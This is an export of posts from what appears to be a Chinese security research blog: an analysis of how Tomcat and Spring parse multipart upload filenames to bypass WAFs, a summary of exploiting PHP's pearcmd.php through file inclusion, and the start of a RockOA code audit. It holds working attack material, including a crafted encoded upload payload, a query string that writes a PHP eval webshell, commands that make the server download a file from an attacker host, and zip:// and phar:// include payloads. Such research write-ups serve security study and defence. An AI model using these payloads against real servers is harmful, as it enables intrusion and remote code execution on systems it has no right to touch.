但由于这里indexof的条件变成了”=”号，而不像spring4那样的filename=/filename=*，毕竟indexof默认取第一个，造成不能像spring4那样做嵌套操作","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"探寻Tomcat文件上传流量层面绕waf新姿势","slug":"year/2022/6/探寻Tomcat文件上传流量层面绕waf新姿势","date":"2022-06-19T05:50:24.000Z","updated":"2024-08-04T09:01:49.648Z","comments":true,"path":"2022/06/19/year/2022/6/探寻Tomcat文件上传流量层面绕waf新姿势/","link":"","permalink":"https://y4tacker.github.io/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/","excerpt":"","text":"探寻Tomcat文件上传流量层面绕waf新姿势写在前面​ 无意中看到ch1ng师傅的文章觉得很有趣，不得不感叹师傅太厉害了，但我一看那长篇的函数总觉得会有更骚的东西，所幸还真的有，借此机会就发出来一探究竟，同时也不得不感慨下RFC文档的妙处，当然本文针对的技术也仅仅只是在流量层面上waf的绕过 Pre很神奇对吧，当然这不是终点,接下来我们就来一探究竟 前置这里简单说一下师傅的思路 部署与处理上传war的servlet是org.apache.catalina.manager.HTMLManagerServlet 在文件上传时最终会通过处理org.apache.catalina.manager.HTMLManagerServlet#upload 调用的是其子类实现类org.apache.catalina.core.ApplicationPart#getSubmittedFileName 这里获取filename的时候的处理很有趣 看到这段注释，发现在RFC 6266文档当中也提出这点 1Avoid including the &quot;\\&quot; character in the quoted-string form of the filename parameter, as escaping is not implemented by some user agents, and &quot;\\&quot; can be considered an illegal path character. 那么我们的tomcat是如何处理的嘞？这里它通过函数HttpParser.unquote去进行处理 1234567891011121314151617181920212223242526272829public static String unquote(String input) &#123; if (input == null || input.length() &lt; 2) &#123; return input; &#125; int start; int end; // Skip surrounding quotes if there are any if (input.charAt(0) == &#x27;&quot;&#x27;) &#123; start = 1; end = input.length() - 1; &#125; else &#123; start = 0; end = input.length(); &#125; StringBuilder result = new StringBuilder(); for (int i = start ; i &lt; end; i++) &#123; char c = input.charAt(i); if (input.charAt(i) == &#x27;\\\\&#x27;) &#123; i++; result.append(input.charAt(i)); &#125; else &#123; result.append(c); &#125; &#125; return result.toString(); &#125; 简单做个总结如果首位是&quot;(前提条件是里面有\\字符)，那么就会去掉跳过从第二个字符开始，并且末尾也会往前移动一位，同时会忽略字符\\，师傅只提到了类似test.\\war这样的例子 但其实根据这个我们还可以进一步构造一些看着比较恶心的比如filename=&quot;&quot;y\\4.\\w\\arK&quot; 深入还是在org.apache.catalina.core.ApplicationPart#getSubmittedFileName当中，一看到这个将字符串转换成map的操作总觉得里面会有更骚的东西(这里先是解析传入的参数再获取，如果解析过程有利用点那么也会影响到后面参数获取)，不扯远继续回到正题 首先它会获取header参数Content-Disposition当中的值，如果以form-data或者attachment开头就会进行我们的解析操作，跟进去一看果不其然，看到RFC2231Utility瞬间不困了 后面这一坨就不必多说了，相信大家已经很熟悉啦支持QP编码，忘了的可以考古看看我之前写的文章Java文件上传大杀器-绕waf(针对commons-fileupload组件)，这里就不再重复这个啦，我们重点看三元运算符前面的这段 既然如此，我们先来看看这个hasEncodedValue判断标准是什么，字符串末尾是否带* 123456public static boolean hasEncodedValue(final String paramName) &#123; if (paramName != null) &#123; return paramName.lastIndexOf(&#x27;*&#x27;) == (paramName.length() - 1); &#125; return false;&#125; 在看解密函数之前我们可以先看看RFC 2231文档当中对此的描述，英文倒是很简单不懂的可以在线翻一下，这里就不贴中文了 1234Asterisks (&quot;*&quot;) are reused to provide the indicator that language and character set information is present and encoding is being used. A single quote (&quot;&#x27;&quot;) is used to delimit the character set and language information at the beginning of the parameter value. Percent signs (&quot;%&quot;) are used as the encoding flag, which agrees with RFC 2047.Specifically, an asterisk at the end of a parameter name acts as an indicator that character set and language information may appear at the beginning of the parameter value. A single quote is used to separate the character set, language, and actual value information in the parameter value string, and an percent sign is used to flag octets encoded in hexadecimal. For example:Content-Type: application/x-stuff; title*=us-ascii&#x27;en-us&#x27;This%20is%20%2A%2A%2Afun%2A%2A%2A 接下来回到正题，我们继续看看这个解码做了些什么 123456789101112131415public static String decodeText(final String encodedText) throws UnsupportedEncodingException &#123; final int langDelimitStart = encodedText.indexOf(&#x27;\\&#x27;&#x27;); if (langDelimitStart == -1) &#123; // missing charset return encodedText; &#125; final String mimeCharset = encodedText.substring(0, langDelimitStart); final int langDelimitEnd = encodedText.indexOf(&#x27;\\&#x27;&#x27;, langDelimitStart + 1); if (langDelimitEnd == -1) &#123; // missing language return encodedText; &#125; final byte[] bytes = fromHex(encodedText.substring(langDelimitEnd + 1)); return new String(bytes, getJavaCharset(mimeCharset));&#125; 结合注释可以看到标准格式@param encodedText - Text to be decoded has a format of &#123;@code &lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt;&#125;,分别是编码，语言和待解码的字符串，同时这里还适配了对url编码的解码，也就是fromHex函数,具体代码如下，其实就是url解码 123456789101112131415161718private static byte[] fromHex(final String text) &#123; final int shift = 4; final ByteArrayOutputStream out = new ByteArrayOutputStream(text.length()); for (int i = 0; i &lt; text.length();) &#123; final char c = text.charAt(i++); if (c == &#x27;%&#x27;) &#123; if (i &gt; text.length() - 2) &#123; break; // unterminated sequence &#125; final byte b1 = HEX_DECODE[text.charAt(i++) &amp; MASK]; final byte b2 = HEX_DECODE[text.charAt(i++) &amp; MASK]; out.write((b1 &lt;&lt; shift) | b2); &#125; else &#123; out.write((byte) c); &#125; &#125; return out.toByteArray();&#125; 因此我们将值当中值得注意的点梳理一下 支持编码的解码 值当中可以进行url编码 @code&lt;charset&gt;&#39;&lt;language&gt;&#39;&lt;encoded_value&gt; 中间这位language可以随便写，代码里没有用到这个的处理 既然如此那么我们首先就可以排出掉utf-8，毕竟这个解码后就直接是明文，从Java标准库当中的charsets.jar可以看出，支持的编码有很多 同时通过简单的代码也可以输出 123456789101112Locale locale = Locale.getDefault();Map&lt;String, Charset&gt; maps = Charset.availableCharsets();StringBuilder sb = new StringBuilder();sb.append(&quot;&#123;&quot;);for (Map.Entry&lt;String, Charset&gt; entry : maps.entrySet()) &#123; String key = entry.getKey(); Charset value = entry.getValue(); sb.append(&quot;\\&quot;&quot; + key + &quot;\\&quot;,&quot;);&#125;sb.deleteCharAt(sb.length() - 1);sb.append(&quot;&#125;&quot;);System.out.println(sb.toString()); 运行输出 12//res&#123;&quot;Big5&quot;,&quot;Big5-HKSCS&quot;,&quot;CESU-8&quot;,&quot;EUC-JP&quot;,&quot;EUC-KR&quot;,&quot;GB18030&quot;,&quot;GB2312&quot;,&quot;GBK&quot;,&quot;IBM-Thai&quot;,&quot;IBM00858&quot;,&quot;IBM01140&quot;,&quot;IBM01141&quot;,&quot;IBM01142&quot;,&quot;IBM01143&quot;,&quot;IBM01144&quot;,&quot;IBM01145&quot;,&quot;IBM01146&quot;,&quot;IBM01147&quot;,&quot;IBM01148&quot;,&quot;IBM01149&quot;,&quot;IBM037&quot;,&quot;IBM1026&quot;,&quot;IBM1047&quot;,&quot;IBM273&quot;,&quot;IBM277&quot;,&quot;IBM278&quot;,&quot;IBM280&quot;,&quot;IBM284&quot;,&quot;IBM285&quot;,&quot;IBM290&quot;,&quot;IBM297&quot;,&quot;IBM420&quot;,&quot;IBM424&quot;,&quot;IBM437&quot;,&quot;IBM500&quot;,&quot;IBM775&quot;,&quot;IBM850&quot;,&quot;IBM852&quot;,&quot;IBM855&quot;,&quot;IBM857&quot;,&quot;IBM860&quot;,&quot;IBM861&quot;,&quot;IBM862&quot;,&quot;IBM863&quot;,&quot;IBM864&quot;,&quot;IBM865&quot;,&quot;IBM866&quot;,&quot;IBM868&quot;,&quot;IBM869&quot;,&quot;IBM870&quot;,&quot;IBM871&quot;,&quot;IBM918&quot;,&quot;ISO-2022-CN&quot;,&quot;ISO-2022-JP&quot;,&quot;ISO-2022-JP-2&quot;,&quot;ISO-2022-KR&quot;,&quot;ISO-8859-1&quot;,&quot;ISO-8859-13&quot;,&quot;ISO-8859-15&quot;,&quot;ISO-8859-2&quot;,&quot;ISO-8859-3&quot;,&quot;ISO-8859-4&quot;,&quot;ISO-8859-5&quot;,&quot;ISO-8859-6&quot;,&quot;ISO-8859-7&quot;,&quot;ISO-8859-8&quot;,&quot;ISO-8859-9&quot;,&quot;JIS_X0201&quot;,&quot;JIS_X0212-1990&quot;,&quot;KOI8-R&quot;,&quot;KOI8-U&quot;,&quot;Shift_JIS&quot;,&quot;TIS-620&quot;,&quot;US-ASCII&quot;,&quot;UTF-16&quot;,&quot;UTF-16BE&quot;,&quot;UTF-16LE&quot;,&quot;UTF-32&quot;,&quot;UTF-32BE&quot;,&quot;UTF-32LE&quot;,&quot;UTF-8&quot;,&quot;windows-1250&quot;,&quot;windows-1251&quot;,&quot;windows-1252&quot;,&quot;windows-1253&quot;,&quot;windows-1254&quot;,&quot;windows-1255&quot;,&quot;windows-1256&quot;,&quot;windows-1257&quot;,&quot;windows-1258&quot;,&quot;windows-31j&quot;,&quot;x-Big5-HKSCS-2001&quot;,&quot;x-Big5-Solaris&quot;,&quot;x-COMPOUND_TEXT&quot;,&quot;x-euc-jp-linux&quot;,&quot;x-EUC-TW&quot;,&quot;x-eucJP-Open&quot;,&quot;x-IBM1006&quot;,&quot;x-IBM1025&quot;,&quot;x-IBM1046&quot;,&quot;x-IBM1097&quot;,&quot;x-IBM1098&quot;,&quot;x-IBM1112&quot;,&quot;x-IBM1122&quot;,&quot;x-IBM1123&quot;,&quot;x-IBM1124&quot;,&quot;x-IBM1166&quot;,&quot;x-IBM1364&quot;,&quot;x-IBM1381&quot;,&quot;x-IBM1383&quot;,&quot;x-IBM300&quot;,&quot;x-IBM33722&quot;,&quot;x-IBM737&quot;,&quot;x-IBM833&quot;,&quot;x-IBM834&quot;,&quot;x-IBM856&quot;,&quot;x-IBM874&quot;,&quot;x-IBM875&quot;,&quot;x-IBM921&quot;,&quot;x-IBM922&quot;,&quot;x-IBM930&quot;,&quot;x-IBM933&quot;,&quot;x-IBM935&quot;,&quot;x-IBM937&quot;,&quot;x-IBM939&quot;,&quot;x-IBM942&quot;,&quot;x-IBM942C&quot;,&quot;x-IBM943&quot;,&quot;x-IBM943C&quot;,&quot;x-IBM948&quot;,&quot;x-IBM949&quot;,&quot;x-IBM949C&quot;,&quot;x-IBM950&quot;,&quot;x-IBM964&quot;,&quot;x-IBM970&quot;,&quot;x-ISCII91&quot;,&quot;x-ISO-2022-CN-CNS&quot;,&quot;x-ISO-2022-CN-GB&quot;,&quot;x-iso-8859-11&quot;,&quot;x-JIS0208&quot;,&quot;x-JISAutoDetect&quot;,&quot;x-Johab&quot;,&quot;x-MacArabic&quot;,&quot;x-MacCentralEurope&quot;,&quot;x-MacCroatian&quot;,&quot;x-MacCyrillic&quot;,&quot;x-MacDingbat&quot;,&quot;x-MacGreek&quot;,&quot;x-MacHebrew&quot;,&quot;x-MacIceland&quot;,&quot;x-MacRoman&quot;,&quot;x-MacRomania&quot;,&quot;x-MacSymbol&quot;,&quot;x-MacThai&quot;,&quot;x-MacTurkish&quot;,&quot;x-MacUkraine&quot;,&quot;x-MS932_0213&quot;,&quot;x-MS950-HKSCS&quot;,&quot;x-MS950-HKSCS-XP&quot;,&quot;x-mswin-936&quot;,&quot;x-PCK&quot;,&quot;x-SJIS_0213&quot;,&quot;x-UTF-16LE-BOM&quot;,&quot;X-UTF-32BE-BOM&quot;,&quot;X-UTF-32LE-BOM&quot;,&quot;x-windows-50220&quot;,&quot;x-windows-50221&quot;,&quot;x-windows-874&quot;,&quot;x-windows-949&quot;,&quot;x-windows-950&quot;,&quot;x-windows-iso2022jp&quot;&#125; 这里作为演示我就随便选一个了UTF-16BE 同样的我们也可以进行套娃结合上面的filename=&quot;&quot;y\\4.\\w\\arK&quot;改成filename=&quot;UTF-16BE&#39;Y4tacker&#39;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot; 接下来处理点小加强，可以看到在这里分隔符无限加，而且加了🌟号的字符之后也会去除一个🌟号 因此我们最终可以得到如下payload，此时仅仅基于正则的waf规则就很有可能会失效 1234567------WebKitFormBoundaryQKTY1MomsixvN8vXContent-Disposition: form-data*;;;;;;;;;;name*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00d%00e%00p%00l%00o%00y%00W%00a%00r&quot;;;;;;;;;filename*=&quot;UTF-16BE&#x27;Y4tacker&#x27;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;Content-Type: application/octet-stream123------WebKitFormBoundaryQKTY1MomsixvN8vX-- 可以看见成功上传 变形 更新2022-06-20这里测试版本是Tomcat8.5.72，这里也不想再测其他版本差异了只是提供一种思路 在此基础上我发现还可以做一些新的东西，其实就是对org.apache.tomcat.util.http.fileupload.ParameterParser#parse(char[], int, int, char)函数进行深入分析 在获取值的时候paramValue = parseQuotedToken(new char[] &#123;separator &#125;);，其实是按照分隔符;分割，因此我们不难想到前面的东西其实可以不用&quot;进行包裹，在parseQuotedToken最后返回调用的是return getToken(true);，这个函数也很简单就不必多解释 1234567891011121314151617181920212223private String getToken(final boolean quoted) &#123; // Trim leading white spaces while ((i1 &lt; i2) &amp;&amp; (Character.isWhitespace(chars[i1]))) &#123; i1++; &#125; // Trim trailing white spaces while ((i2 &gt; i1) &amp;&amp; (Character.isWhitespace(chars[i2 - 1]))) &#123; i2--; &#125; // Strip away quotation marks if necessary if (quoted &amp;&amp; ((i2 - i1) &gt;= 2) &amp;&amp; (chars[i1] == &#x27;&quot;&#x27;) &amp;&amp; (chars[i2 - 1] == &#x27;&quot;&#x27;)) &#123; i1++; i2--; &#125; String result = null; if (i2 &gt; i1) &#123; result = new String(chars, i1, i2 - i1); &#125; return result; &#125; 可以看到这里也是成功识别的 既然调用parse解析参数时可以不被包裹，结合getToken函数我们可以知道在最后一个参数其实就不必要加;了，并且解析完通过params.get(&quot;filename&quot;)获取到参数后还会调用到org.apache.tomcat.util.http.parser.HttpParser#unquote那也可以基于此再次变形 为了直观这里就直接明文了，是不是也很神奇 扩大利用面现在只是war包的场景，多多少少影响性被降低，但我们这串代码其实抽象出来就一个关键 12Part warPart = request.getPart(&quot;deployWar&quot;);String filename = warPart.getSubmittedFileName(); 通过查询官方文档，可以发现从Servlet3.1开始，tomcat新增了对此的支持，也就意味着简单通过javax.servlet.http.HttpServletRequest#getParts即可，简化了我们文件上传的代码负担(如果我是开发人员，我肯定首选也会使用，谁不想当懒狗呢) 1234567getSubmittedFileNameString getSubmittedFileName()Gets the file name specified by the clientReturns:the submitted file nameSince:Servlet 3.1 更新Spring 2022-06-20早上起床想着昨晚和陈师的碰撞，起床后又看了下陈师的星球，看到这个不妨再试试Spring是否也按照了RFC的实现呢（毕竟Spring内置了Tomcat，可能会有类似的呢） Spring为我们提供了处理文件上传MultipartFile的接口 1234567891011121314151617181920public interface MultipartFile extends InputStreamSource &#123; String getName(); //获取参数名 @Nullable String getOriginalFilename();//原始的文件名 @Nullable String getContentType();//内容类型 boolean isEmpty(); long getSize(); //大小 byte[] getBytes() throws IOException;// 获取字节数组 InputStream getInputStream() throws IOException;//以流方式进行读取 default Resource getResource() &#123; return new MultipartFileResource(this); &#125; // 将上传的文件写入文件系统 void transferTo(File var1) throws IOException, IllegalStateException; // 写入指定path default void transferTo(Path dest) throws IOException, IllegalStateException &#123; FileCopyUtils.copy(this.getInputStream(), Files.newOutputStream(dest)); &#125;&#125; 而spring处理文件上传逻辑的具体关键逻辑在org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest，抄个文件上传demo来进行测试分析 Spring4这里我测试了springboot1.5.20.RELEASE内置Spring4.3.23，具体小版本之间是否有差异这里就不再探究 其中关于org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest的调用也有些不同 123456789101112131415161718192021222324252627private void parseRequest(HttpServletRequest request) &#123; try &#123; Collection&lt;Part&gt; parts = request.getParts(); this.multipartParameterNames = new LinkedHashSet(parts.size()); MultiValueMap&lt;String, MultipartFile&gt; files = new LinkedMultiValueMap(parts.size()); Iterator var4 = parts.iterator(); while(var4.hasNext()) &#123; Part part = (Part)var4.next(); String disposition = part.getHeader(&quot;content-disposition&quot;); String filename = this.extractFilename(disposition); if (filename == null) &#123; filename = this.extractFilenameWithCharset(disposition); &#125; if (filename != null) &#123; files.add(part.getName(), new StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename)); &#125; else &#123; this.multipartParameterNames.add(part.getName()); &#125; &#125; this.setMultipartFiles(files); &#125; catch (Throwable var8) &#123; throw new MultipartException(&quot;Could not parse multipart servlet request&quot;, var8); &#125;&#125; 简单看了下和tomcat之前的分析很像，这里Spring4当中同时也是支持filename*格式的 看看具体逻辑 1234567891011121314151617181920212223242526272829private String extractFilename(String contentDisposition, String key) &#123; if (contentDisposition == null) &#123; return null; &#125; else &#123; int startIndex = contentDisposition.indexOf(key); if (startIndex == -1) &#123; return null; &#125; else &#123; //截取filename=后面的内容 String filename = contentDisposition.substring(startIndex + key.length()); int endIndex; //如果后面开头是“则截取”“之间的内容 if (filename.startsWith(&quot;\\&quot;&quot;)) &#123; endIndex = filename.indexOf(&quot;\\&quot;&quot;, 1); if (endIndex != -1) &#123; return filename.substring(1, endIndex); &#125; &#125; else &#123; //可以看到如果没有“”包裹其实也可以，这和当时陈师分享的其中一个trick是符合的 endIndex = filename.indexOf(&quot;;&quot;); if (endIndex != -1) &#123; return filename.substring(0, endIndex); &#125; &#125; return filename; &#125; &#125; &#125; 简单测试一波，与心中结果一致 同时由于indexof默认取第一位，因此我们还可以加一些干扰字符尝试突破waf逻辑 如果filename*开头但是spring4当中没有关于url解码的部分 没有这部分会出现什么呢？我们只能自己发包前解码，这样的话如果出现00字节就会报错，报错后 看起来是spring框架解析header的原因，但是这里报错信息也很有趣将项目地址的绝对路径抛出了，感觉不失为信息收集的一种方式 Spring5也是随便来个新的springboot2.6.4的，来看看spring5的，小版本间差异不测了，经过测试发现spring5和spring4之间也是有版本差异处理也有些不同，同样是在parseRequest 1234567891011121314151617181920212223242526272829private void parseRequest(HttpServletRequest request) &#123; try &#123; Collection&lt;Part&gt; parts = request.getParts(); this.multipartParameterNames = new LinkedHashSet(parts.size()); MultiValueMap&lt;String, MultipartFile&gt; files = new LinkedMultiValueMap(parts.size()); Iterator var4 = parts.iterator(); while(var4.hasNext()) &#123; Part part = (Part)var4.next(); String headerValue = part.getHeader(&quot;Content-Disposition&quot;); ContentDisposition disposition = ContentDisposition.parse(headerValue); String filename = disposition.getFilename(); if (filename != null) &#123; if (filename.startsWith(&quot;=?&quot;) &amp;&amp; filename.endsWith(&quot;?=&quot;)) &#123; filename = StandardMultipartHttpServletRequest.MimeDelegate.decode(filename); &#125; files.add(part.getName(), new StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename)); &#125; else &#123; this.multipartParameterNames.add(part.getName()); &#125; &#125; this.setMultipartFiles(files); &#125; catch (Throwable var9) &#123; this.handleParseFailure(var9); &#125; &#125; 很明显可以看到这一行filename.startsWith(&quot;=?&quot;) &amp;&amp; filename.endsWith(&quot;?=&quot;)，可以看出Spring对文件名也是支持QP编码 在上面能看到还调用了一个解析的方法org.springframework.http.ContentDisposition#parse ，多半就是这里了,那么继续深入下 可以看到一方面是QP编码，另一方面也是支持filename*,同样获取值是截取&quot;之间的或者没找到就直接截取=后面的部分 如果是filename*后面的处理逻辑就是else分之，可以看出和我们上面分析spring4还是有点区别就是这里只支持UTF-8/ISO-8859-1/US_ASCII，编码受限制 123456789int idx1 = value.indexOf(39);int idx2 = value.indexOf(39, idx1 + 1);if (idx1 != -1 &amp;&amp; idx2 != -1) &#123; charset = Charset.forName(value.substring(0, idx1).trim()); Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), &quot;Charset should be UTF-8 or ISO-8859-1&quot;); filename = decodeFilename(value.substring(idx2 + 1), charset);&#125; else &#123; filename = decodeFilename(value, StandardCharsets.US_ASCII);&#125; 但其实仔细想这个结果是符合RFC文档要求的 接着我们继续后面会继续执行decodeFilename 代码逻辑很清晰字符串的解码,如果字符串是否在RFC 5987文档规定的Header字符就直接调用baos.write写入 1234attr-char = ALPHA / DIGIT / &quot;!&quot; / &quot;#&quot; / &quot;$&quot; / &quot;&amp;&quot; / &quot;+&quot; / &quot;-&quot; / &quot;.&quot; / &quot;^&quot; / &quot;_&quot; / &quot;`&quot; / &quot;|&quot; / &quot;~&quot; ; token except ( &quot;*&quot; / &quot;&#x27;&quot; / &quot;%&quot; ) 如果不在要求这一位必须是%然后16进制解码后两位，其实就是url解码，简单测试即可 参考文章https://www.ch1ng.com/blog/264.html https://datatracker.ietf.org/doc/html/rfc6266#section-4.3 https://datatracker.ietf.org/doc/html/rfc2231 https://datatracker.ietf.org/doc/html/rfc5987#section-3.2.1 https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/ https://docs.oracle.com/javaee/7/api/javax/servlet/http/Part.html#getSubmittedFileName-- http://t.zoukankan.com/summerday152-p-13969452.html#%E4%BA%8C%E3%80%81%E5%A4%84%E7%90%86%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6multipartfile%E6%8E%A5%E5%8F%A3","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Waf","slug":"Waf","permalink":"https://y4tacker.github.io/tags/Waf/"}]},{"title":"关于pearcmd利用总结","slug":"year/2022/6/关于pearcmd利用总结","date":"2022-06-19T01:08:07.000Z","updated":"2024-08-04T09:01:49.499Z","comments":true,"path":"2022/06/19/year/2022/6/关于pearcmd利用总结/","link":"","permalink":"https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","excerpt":"","text":"环境条件有两个条件 pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php 并且php.ini当中 register_argc_argv=On需要开启 准备12&lt;?phpinclude($_GET[&#x27;file&#x27;]); pear会在pearcmd.php获取命令行参数 123456789PEAR_Command::setFrontendType(&#x27;CLI&#x27;);$all_commands = PEAR_Command::getCommands();$argv = Console_Getopt::readPHPArgv();// fix CGI sapi oddity - the -- in pear.bat/pear is not removedif (php_sapi_name() != &#x27;cli&#x27; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#x27;--&#x27;) &#123; unset($argv[1]); $argv = array_values($argv);&#125; 而pear获取命令行参数在readPHPArgv()中 123456789101112131415public static function readPHPArgv() &#123; global $argv; if (!is_array($argv)) &#123; if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123; if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123; $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); &#125; return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;]; &#125; return $_SERVER[&#x27;argv&#x27;]; &#125; return $argv; &#125; 这里会先尝试$argv，如果不存在再尝试$_SERVER[&#39;argv&#39;]，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数 利用可以看到参数有这么多 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Commands:build Build an Extension From C Sourcebundle Unpacks a Pecl Packagechannel-add Add a Channelchannel-alias Specify an alias to a channel namechannel-delete Remove a Channel From the Listchannel-discover Initialize a Channel from its serverchannel-info Retrieve Information on a Channelchannel-login Connects and authenticates to remote channel serverchannel-logout Logs out from the remote channel serverchannel-update Update an Existing Channelclear-cache Clear Web Services Cacheconfig-create Create a Default configuration fileconfig-get Show One Settingconfig-help Show Information About Settingconfig-set Change Settingconfig-show Show All Settingsconvert Convert a package.xml 1.0 to package.xml 2.0 formatcvsdiff Run a &quot;cvs diff&quot; for all files in a packagecvstag Set CVS Release Tagdownload Download Packagedownload-all Downloads each available package from the default channelinfo Display information about a packageinstall Install Packagelist List Installed Packages In The Default Channellist-all List All Packageslist-channels List Available Channelslist-files List Files In Installed Packagelist-upgrades List Available Upgradeslogin Connects and authenticates to remote server [Deprecated in favor of channel-login]logout Logs out from the remote server [Deprecated in favor of channel-logout]makerpm Builds an RPM spec file from a PEAR packagepackage Build Packagepackage-dependencies Show package dependenciespackage-validate Validate Package Consistencypickle Build PECL Packageremote-info Information About Remote Packagesremote-list List Remote Packagesrun-scripts Run Post-Install Scripts bundled with a packagerun-tests Run Regression Testssearch Search remote package databaseshell-test Shell Script Testsign Sign a package distribution filesvntag Set SVN Release Taguninstall Un-install Packageupdate-channels Update the Channel Listupgrade Upgrade Packageupgrade-all Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters] 可以看见这里面有三个可能利用的参数，一个是p牛文中提到的config-create，一个install还有用过download config-create多加一个die，防止多个输出 1/?file=/www/server/php/52/lib/php/pearcmd.php&amp;+config-create+/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);die()?&gt;+/tmp/test.php install1/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+install+http://vps/1.php 文件就会被下载到/tmp/pear/download/1.php，回显能看到 download个人觉得这个比上面install舒服点，这个直接下载到web目录了，不用提前知道web目录具体路径 1/?file=/www/server/php/52/lib/php/peclcmd.php&amp;+download+http://vps/1.php 闲话如果pearcmd关键词被ban怎么半，其实可以用peclcmd.php作为平替，在这个php文件当中其实就是引入了pearcmd.php 123456789if (&#x27;/www/server/php/52/lib/php&#x27; != &#x27;@&#x27;.&#x27;include_path&#x27;.&#x27;@&#x27;) &#123; ini_set(&#x27;include_path&#x27;, &#x27;/www/server/php/52/lib/php&#x27;); $raw = false;&#125; else &#123; // this is a raw, uninstalled pear, either a cvs checkout, or php distro $raw = true;&#125;define(&#x27;PEAR_RUNTYPE&#x27;, &#x27;pecl&#x27;);require_once &#x27;pearcmd.php&#x27;; 参考文章https://tttang.com/archive/1312/","categories":[{"name":"php","slug":"php","permalink":"https://y4tacker.github.io/categories/php/"}],"tags":[{"name":"pearcmd","slug":"pearcmd","permalink":"https://y4tacker.github.io/tags/pearcmd/"}]},{"title":"Y4教你审计系列之RockOA","slug":"year/2022/6/Y4教你审计系列之RockOA","date":"2022-06-16T08:42:37.000Z","updated":"2024-08-04T09:01:49.445Z","comments":true,"path":"2022/06/16/year/2022/6/Y4教你审计系列之RockOA/","link":"","permalink":"https://y4tacker.github.io/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8BRockOA/","excerpt":"","text":"Y4教你审计系列之RockOA写在前面不知道是啥版本无语子，反正老师给的简单审一下，顺便吐槽一句老师连续两天只教用工具到处乱扫累 放了个备份在https://github.com/Y4tacker/CTFBackup/blob/main/oa/rockoa/rockoa.zip 架构不同于其他这个默认首页上rock.php，也是简单的自己去实现了MVC，我们先看看rock.php 可以看到，首先是定义了项目的PROJECT变量，接下来判断是否安装以及如果没有登陆则跳转到登陆页 12345678910111213141516171819202122232425&lt;?php define(&#x27;PROJECT&#x27;, &#x27;webrock&#x27;);include_once(&#x27;config/config.php&#x27;);$islogin = (int)$rock-&gt;session(QOM.&#x27;adminid&#x27;,0);$m = &#x27;index&#x27;;$p = PROJECT;$d = &#x27;&#x27;;$a = &#x27;default&#x27;;$ajaxbool = $rock-&gt;get(&#x27;ajaxbool&#x27;,&#x27;false&#x27;);$mode = $rock-&gt;get(&#x27;m&#x27;, $m);$dir = $rock-&gt;get(&#x27;d&#x27;, $d);if(!$config[&#x27;install&#x27;] &amp;&amp; $mode != &#x27;install&#x27;)$rock-&gt;location(&#x27;?m=install&#x27;);//已可以正常登录，这句可删除if($mode==&#x27;login&#x27; || $dir==&#x27;taskrun&#x27; || $mode==&#x27;taskrun&#x27; || $mode==&#x27;install&#x27;)$islogin = 1;//不可删除if($islogin == 0)&#123; if($ajaxbool == &#x27;true&#x27;)&#123; echo &#x27;sorry! not sign&#x27;; &#125;else&#123; $rock-&gt;location(&#x27;?m=login&#x27;); &#125; exit();&#125;include_once(&#x27;include/View.php&#x27;); 接下来才是重点include_once(&#39;include/View.php&#39;);，这里看见有三个重要的参数，一个d决定项目路径也就是对应web根目录下的子目录名称，m对应模块名称其实就是下一级目录以及通过d决定了引入的类（目录与Action.php同名），以及a参数决定执行哪个方法，同样可以看到这里可以配合目录穿越引入其他的类，可惜不能控制前缀，不然低版本我们可以配合zip或者phar(php&gt;5.3.0),payload像下面这样 12zip:///var/www/html/info.zip%23info.phpphar:///var/www/html/info.zip/info.php 接下来其实还有一个重要的参数ajaxbool也是get请求传入，如果为true则回去访问对应类方法当中的Ajax方法，如果不是则访问对应类方法的Action方法，并渲染tpl模板 